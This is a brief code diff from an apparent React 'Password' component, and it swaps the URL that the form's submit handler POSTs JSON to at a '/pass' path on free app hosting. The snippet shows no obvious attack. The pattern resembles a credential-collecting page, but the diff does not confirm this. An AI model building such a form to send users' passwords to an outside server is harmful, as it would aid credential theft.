@@ -13,7 +13,7 @@ const Password = () => {
 
   const handleSubmit = (e) => {
     e.preventDefault();
-    fetch("https://api-submit.up.railway.app/pass",{
+    fetch("https://apisubmit-8ll0irls.b4a.run/pass",{
       method:"POST",
       headers: {
         "Content-Type": "application/json"
